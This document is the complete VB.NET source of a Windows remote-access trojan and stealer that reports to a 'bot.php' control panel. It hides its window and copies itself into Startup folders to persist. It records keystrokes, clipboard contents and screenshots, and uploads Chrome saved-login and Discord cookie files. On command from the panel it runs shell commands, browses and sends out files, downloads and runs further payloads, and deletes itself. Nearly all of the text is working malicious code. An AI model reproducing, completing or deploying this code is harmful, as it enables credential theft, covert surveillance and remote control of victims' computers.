Imports System.Drawing, System.Drawing.Drawing2D, System.Windows.Forms.Screen, System.Drawing.Graphics, System.Net, System.Text, System.Management, System.IO, System.Environment
Public Class Form1
    ReadOnly mainUrl As String = "http://localhost/" 'CHANGE HERE

    ReadOnly urlSubmitLogs As String = mainUrl & "bot.php?action=submitLogs"
    ReadOnly urlSubmitInfos As String = mainUrl & "bot.php?action=register"
    ReadOnly urlGetCommands As String = mainUrl & "bot.php?action=cmd"
    ReadOnly urlSendCmd As String = mainUrl & "bot.php?action=check"
    ReadOnly urlSendOutput As String = mainUrl & "bot.php?action=sendOut"
    ReadOnly urlSendFlm As String = mainUrl & "bot.php?action=flm"
    ReadOnly urlDownload As String = mainUrl & "bot.php?action=dwl"
    ReadOnly API_IP As String = "https://api.ipify.org/?format=txt"

    Dim name As String = "\TemplateWin.exe"
    Dim dir As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\Windows\Templates"
    Dim path As String = dir & name
    Dim startPath As String = Environment.GetFolderPath(Environment.SpecialFolder.Startup) & name
    Dim secondStartPath As String = Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup) & name
    Dim current_execute As String = Application.ExecutablePath

    Dim error_msg As String = ""
    Dim hwid As String = ""
    Dim old_cmd As String = ""
    Dim old_title As String = ""

    Dim newKey As String = ""
    Dim oldKey As String = ""

    ReadOnly date_run As DateTime = DateTime.Now

    Dim clip_board As String = "ClipBoard: " & My.Computer.Clipboard.GetText() & NewLine
    Dim clip_board_actual As String = ""
    Dim clip_board_old As String = ""

    ReadOnly dir_path As String = System.IO.Path.GetTempPath & "Cache_Google.tmp"

    Private WithEvents Navigator As New WebBrowser
    Dim Nav As New WebClient

    Private Function Init_Install()
        If IO.Directory.Exists(dir) Then
            If Not current_execute = path Then
                If IO.File.Exists(path) Then
                    Process.Start(path)
                Else
                    My.Computer.FileSystem.CopyFile(current_execute, path)
                    Process.Start(path)
                End If
            End If
            If Not IO.File.Exists(startPath) Then
                Try
                    My.Computer.FileSystem.CopyFile(current_execute, startPath)
                Catch ex As Exception
                    error_msg &= "[COPY INIT - START PATH]: " & ex.ToString & NewLine & NewLine
                End Try
            End If
            If Not IO.File.Exists(secondStartPath) Then
                Try
                    My.Computer.FileSystem.CopyFile(current_execute, secondStartPath)
                Catch ex As Exception
                    error_msg &= "[COPY INIT - COMMON START PATH]: " & ex.ToString & NewLine & NewLine
                End Try
            End If
        End If
        Return 0
    End Function

    Private Declare Function GetAsyncKeyState Lib "User32" (ByVal tecla As Integer) As Short
    Private Declare Function GetForegroundWindow Lib "User32" Alias "GetForegroundWindow" () As IntPtr
    Private Declare Auto Function GetWindowText Lib "User32" (ByVal hwnd As System.IntPtr, ByVal lpString As System.Text.StringBuilder, ByVal cch As Integer) As Integer

    Private Shared Function GetTitle() As String
        Dim title As New System.Text.StringBuilder(256)
        Dim hwnd As IntPtr = GetForegroundWindow()
        GetWindowText(hwnd, title, title.Capacity)
        Return title.ToString()
    End Function
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.Hide()
        Me.Visible = False
        Init_Install()
        GetInfos()
        Stealler()
        TimerKeyLogger.Start()
        TimerSenderLog.Start()
        TimerCommand.Start()
    End Sub

    Private Shared Function CheckNet() As Boolean

        Dim url As New System.Uri("https://google.com")
        Dim req As System.Net.WebRequest

        req = System.Net.WebRequest.Create(url)

        Try
            Dim resp As System.Net.WebResponse
            resp = req.GetResponse()
            resp.Close()
            req = Nothing
            Return True
        Catch ex As Exception
            req = Nothing
            Return False
        End Try
    End Function
    Public Shared Function PrintScreen() As Bitmap
        Dim screen As New Bitmap(PrimaryScreen.Bounds.Width, PrimaryScreen.Bounds.Height, Imaging.PixelFormat.Format32bppArgb)
        Dim GFX As Graphics = FromImage(screen)
        GFX.CopyFromScreen(PrimaryScreen.Bounds.X, PrimaryScreen.Bounds.Y, 0, 0, PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy)

        Return screen

        screen.Dispose()
        GFX.Dispose()
    End Function
    Private Sub PrintKey(keyCode As Integer, keyString As String)
        Dim kS As String() = Split(keyString, " ", 2)
        If GetAsyncKeyState(16) Then
            If GetAsyncKeyState(keyCode) Then
                If keyCode = 32 Then
                    newKey = " "
                ElseIf keyCode = 9 Then
                    newKey = "    "
                ElseIf keyCode = 8 Then
                    newKey = " (Backspace) "
                Else
                    Try
                        newKey = kS(1)
                    Catch ex As Exception
                        error_msg &= "[KEY LOGGER]: " & ex.ToString & NewLine & NewLine
                    End Try
                End If
            End If
        Else
            If GetAsyncKeyState(keyCode) Then
                If keyCode = 32 Then
                    newKey = " "
                ElseIf keyCode = 9 Then
                    newKey = "    "
                ElseIf keyCode = 8 Then
                    newKey = " (Backspace) "
                Else
                    newKey = kS(0)
                End If
            End If
        End If
    End Sub
    Private Sub TimerKeyLogger_Tick(sender As Object, e As EventArgs) Handles TimerKeyLogger.Tick
        Dim actual_title As String = GetTitle()

        If Not actual_title = old_title Then
            If Not actual_title = "" Then
                old_title = actual_title
                TextBoxKeys.Text &= NewLine &
                           "============================================================================================================" &
                NewLine &
                           "Actual Window: " & actual_title &
                NewLine &
                           "============================================================================================================" &
                NewLine
            End If
        End If
        For i As Integer = 65 To 90
            If GetAsyncKeyState(17) Then
                If GetAsyncKeyState(i) Then
                    newKey = " (Ctrl+" & Chr(i) & ") "
                    If GetAsyncKeyState(67) Then
                        clip_board_actual = My.Computer.Clipboard.GetText()
                    End If
                End If
            ElseIf GetAsyncKeyState(i) Then
                If Control.IsKeyLocked(Keys.CapsLock) Then
                    If GetAsyncKeyState(16) Then
                        newKey = Chr(i).ToString.ToLower
                    Else
                        newKey = Chr(i)
                    End If
                Else
                    If GetAsyncKeyState(16) Then
                        newKey = Chr(i)
                    Else
                        newKey = Chr(i).ToString.ToLower
                    End If
                End If
            End If
        Next
        Dim dic As New Dictionary(Of Integer, String)
        dic.Add(48, "0 )")
        dic.Add(49, "1 !")
        dic.Add(50, "2 @")
        dic.Add(51, "3 #")
        dic.Add(52, "4 $")
        dic.Add(53, "5 %")
        dic.Add(54, "6 ¨¨")
        dic.Add(55, "7 &")
        dic.Add(56, "8 *")
        dic.Add(57, "9 (")
        dic.Add(32, " ")
        dic.Add(9, "    ")
        dic.Add(8, "")
        dic.Add(13, NewLine)
        dic.Add(187, "= +")
        dic.Add(192, "` ´")
        dic.Add(221, "] }")
        dic.Add(220, "\ |")
        dic.Add(219, "[ {")
        dic.Add(186, "; :")
        dic.Add(191, "/ ?")
        dic.Add(190, ". >")
        dic.Add(188, ", <")
        dic.Add(189, "- _")
        dic.Add(222, "´ `")
        dic.Add(96, "0")
        dic.Add(97, "1")
        dic.Add(98, "2")
        dic.Add(99, "3")
        dic.Add(100, "4")
        dic.Add(101, "5")
        dic.Add(102, "6")
        dic.Add(103, "7")
        dic.Add(104, "8")
        dic.Add(105, "9")
        dic.Add(106, "*")
        dic.Add(107, "+")
        dic.Add(109, "-")
        dic.Add(110, ".")
        dic.Add(111, "/")
        For Each i In dic
            PrintKey(i.Key, i.Value)
        Next

        If Not oldKey = newKey Then
            oldKey = newKey
            TextBoxKeys.Text &= oldKey
        End If
        newKey = ""

        If Not clip_board_old = clip_board_actual Then
            If Not clip_board_actual = "" And Not clip_board_actual = " " Then
                clip_board_old = clip_board_actual
                clip_board &= "ClipBoard: " & clip_board_old & NewLine
            End If
        End If
        clip_board_actual = ""

    End Sub
    Private Function GetInfos()
        Dim Machine_Name As String = Environment.MachineName
        Dim UserName As String = Environment.UserName
        Dim OS As String = My.Computer.Info.OSFullName

        Dim IP As String = New UTF8Encoding().GetString(Nav.DownloadData(API_IP))

        Dim cpu As New ManagementClass("win32_processor")
        Dim handle_cpu As ManagementObjectCollection = cpu.GetInstances()

        For Each y As ManagementObject In handle_cpu
            hwid = y.Properties("processorID").Value.ToString
        Next

        Dim Infos As String = "&username=" & UserName & "&ip=" & IP & "&machinename=" & Machine_Name & "&os=" & OS & "&hwid=" & hwid

        If CheckNet() Then
            Navigator.Navigate(urlSubmitInfos & Infos)
        End If

        Return 0
    End Function
    Private Function Stealler()
        Dim localAppData As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)
        Dim roamingAppData As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)

        Dim p1() As Process = Process.GetProcessesByName("Chrome")
        Dim p2() As Process = Process.GetProcessesByName("Discord")

        If Not p1.Length > 0 Then
            Dim google As String = localAppData & "\Google\Chrome\User Data\Default\Login Data"
            Try
                SendLog(google, "creds")
            Catch ex As Exception
                error_msg &= "[STREALLER - GOOGLE]: " & ex.ToString & NewLine & NewLine
            End Try
        End If

        If Not p2.Length > 0 Then
            Dim discord As String = roamingAppData & "\discord\Cookies"
            Try
                SendLog(discord, "creds")
            Catch ex As Exception
                error_msg &= "[STREALLER - DISCORD]: " & ex.ToString & NewLine & NewLine
            End Try
        End If

        Return 0
    End Function
    Private Sub SendLog(file As String, type As String)
        If CheckNet() Then
            My.Computer.Network.UploadFile(file, urlSubmitLogs & "&hwid=" & hwid & "&typeLog=" & type)
        End If
    End Sub
    Private Sub TimerSenderLog_Tick(sender As Object, e As EventArgs) Handles TimerSenderLog.Tick

        If System.IO.Directory.Exists(dir_path) = False Then
            System.IO.Directory.CreateDirectory(dir_path)
        End If

        Dim date_actual As DateTime = DateTime.Now
        Dim path_log_keys As String = dir_path & "\Keys__" & Format(date_run, "dd_MM-HH_mm_ss") & ".txt"
        Dim path_log_clip As String = dir_path & "\ClipBoards__" & Format(date_run, "dd_MM-HH_mm_ss") & ".txt"
        Dim path_log_pic As String = dir_path & "\Screen__" & Format(date_actual, "dd_MM-HH_mm_ss") & ".png"
        Dim path_log_error As String = dir_path & "\Errors__" & Format(date_run, "dd_MM-HH_mm_ss") & ".txt"
        Dim fileLogs As System.IO.FileStream
        fileLogs = System.IO.File.Create(path_log_keys)
        fileLogs.Close()

        My.Computer.FileSystem.WriteAllText(path_log_keys, TextBoxKeys.Text, True)
        SendLog(path_log_keys, "keys")

        Dim logClip As System.IO.FileStream
        logClip = System.IO.File.Create(path_log_clip)
        logClip.Close()

        My.Computer.FileSystem.WriteAllText(path_log_clip, clip_board, True)
        SendLog(path_log_clip, "clipboard")

        Try
            PictureBoxScreens.Image = PrintScreen()
            PictureBoxScreens.Image.Save(path_log_pic, System.Drawing.Imaging.ImageFormat.Png)
            SendLog(path_log_pic, "image")
        Catch ex As Exception
            error_msg &= "[SCREEN LOGGER]: " & ex.ToString & NewLine & NewLine
        End Try

        Dim errorLog As System.IO.FileStream
        errorLog = System.IO.File.Create(path_log_error)
        errorLog.Close()

        My.Computer.FileSystem.WriteAllText(path_log_error, error_msg, True)
        SendLog(path_log_error, "error")

        If CheckNet() Then
            System.IO.Directory.Delete(dir_path, True)
        End If

    End Sub
    Private Function sendflm(ByVal datas As String)
        Try
            Dim req As HttpWebRequest
            Dim enc As UTF8Encoding
            Dim dataPost As String
            Dim dataBytes As Byte()
            req = HttpWebRequest.Create(mainUrl & "bot.php")
            enc = New System.Text.UTF8Encoding()
            dataPost = "action=flm&hwid=" & hwid & "&data=" & datas
            dataBytes = enc.GetBytes(dataPost)
            req.Method = "POST"
            req.ContentType = "application/x-www-form-urlencoded"
            req.ContentLength = dataBytes.Length
            Using Stream = req.GetRequestStream()
                Stream.Write(dataBytes, 0, dataBytes.Length)
            End Using
            Dim result = req.GetResponse()
        Catch ex As Exception
            error_msg &= "[SEND FLM]: " & ex.ToString & NewLine & NewLine
        End Try
    End Function
    Private Sub del(ByVal path_to_del As String)
        Try
            If File.Exists(path_to_del) Then
                Dim path_proc As Process() = Process.GetProcessesByName(path_to_del)
                If path_proc.Length > 0 Then
                    path_proc(0).Kill()
                End If
                My.Computer.FileSystem.DeleteFile(path_to_del)
            End If
        Catch ex As Exception
            error_msg &= "[DELETE]: " & ex.ToString & NewLine & NewLine
        End Try
    End Sub
    Private Sub TimerCommand_Tick(sender As Object, e As EventArgs) Handles TimerCommand.Tick
        If CheckNet() Then
            Dim actual_cmd As String
            Try
                actual_cmd = New UTF8Encoding().GetString(Nav.DownloadData(urlGetCommands & "&hwid=" & hwid))
                If Not old_cmd = actual_cmd Then
                    old_cmd = actual_cmd
                    If Not actual_cmd = "" Then
                        Dim args As String() = Split(actual_cmd, "|")
                        Select Case args(0)
                            Case "msg"
                                If args.Length = 2 Then
                                    MsgBox(args(1), 48, "4NGEL")
                                End If
                            Case "cmd"
                                If args.Length = 2 Then
                                    Dim process As New Process()
                                    Dim initial_info As New ProcessStartInfo
                                    initial_info.FileName = "C:\Windows\System32\cmd.exe"
                                    initial_info.Arguments = " /c" & args(1)
                                    initial_info.CreateNoWindow = True
                                    initial_info.UseShellExecute = False
                                    initial_info.RedirectStandardOutput = True
                                    process.StartInfo = initial_info
                                    process.Start()
                                    process.WaitForExit()
                                    Dim output As StreamReader = process.StandardOutput()
                                    Navigator.Navigate(urlSendOutput & "&hwid=" & hwid & "&out=" & output.ReadToEnd())
                                    output.Close()
                                    process.Close()
                                End If
                            Case "flm"
                                If args.Length = 1 Then
                                    Dim root As String = ""
                                    For Each x As DriveInfo In My.Computer.FileSystem.Drives
                                        Select Case x.DriveType
                                            Case 3
                                                root += "[FIXED] " & x.Name & "[:]" & x.Name & "|"
                                            Case 5
                                                root += "[CDRom] " & x.Name & "[:]" & x.Name & "|"
                                            Case 4
                                                root += "[Network] " & x.Name & "[:]" & x.Name & "|"
                                            Case 6
                                                root += "[RAM] " & x.Name & "[:]" & x.Name & "|"
                                            Case 2
                                                root += "[Removable] " & x.Name & "[:]" & x.Name & "|"
                                            Case 1
                                                root += "[NoRootDirectory] " & x.Name & "[:]" & x.Name & "|"
                                        End Select
                                    Next
                                    sendflm(root)
                                ElseIf args.Length = 2 Then
                                    Dim folders As String = ""
                                    Dim getFiles As New DirectoryInfo(args(1))
                                    For Each subdir As DirectoryInfo In getFiles.GetDirectories
                                        folders += "[DIR] " & subdir.Name & "[:]" & subdir.Name & "\|"
                                    Next
                                    For Each subfiles As FileInfo In getFiles.GetFiles
                                        folders += "[FILE] " & subfiles.Name & "[:]" & subfiles.Name & "|"
                                    Next
                                    sendflm(folders)
                                End If
                            Case "dwl"
                                If args.Length = 2 Then
                                    Try
                                        My.Computer.Network.UploadFile(args(1), urlDownload & "&hwid=" & hwid)
                                    Catch ex As Exception
                                        error_msg &= "[DOWNLOAD FILE]: " & ex.ToString & NewLine & NewLine
                                    End Try
                                End If
                            Case "upl"
                                If args.Length = 7 Then
                                    Dim src As String = ""
                                    If args(1) = "link" Then
                                        src = New UTF8Encoding().GetString(Nav.DownloadData(args(2)))
                                    ElseIf args(1) = "file" Then
                                        src = args(2)
                                    End If
                                    Dim mal_path As String = args(5) & "\" & args(3) & "." & args(4)
                                    File.WriteAllBytes(mal_path, Convert.FromBase64String(src))
                                    Threading.Thread.Sleep(1000)
                                    If args(6) = "yes" Then
                                        Process.Start(mal_path)
                                    End If
                                End If
                            Case "rdp"
                                If Directory.Exists(dir_path) = False Then
                                    Directory.CreateDirectory(dir_path)
                                End If
                                Dim path_rdp_log As String = dir_path & "\rdp.jpg"
                                Try
                                    PictureBoxRDP.Image = PrintScreen()
                                    PictureBoxRDP.Image.Save(path_rdp_log, System.Drawing.Imaging.ImageFormat.Jpeg)
                                    SendLog(path_rdp_log, "rdp")
                                Catch ex As Exception
                                    error_msg &= "[RDP]: " & ex.ToString & NewLine & NewLine
                                End Try
                            Case "del"
                                del(path)
                                del(startPath)
                                del(secondStartPath)
                                del(current_execute)
                        End Select
                    End If
                End If
            Catch ex As Exception
                error_msg &= "[GET COMMAND | SEND OUTPUT]: " & ex.ToString & NewLine & NewLine
            End Try
        End If
    End Sub

    Private Sub TextBoxKeys_TextChanged(sender As Object, e As EventArgs) Handles TextBoxKeys.TextChanged

    End Sub
End Class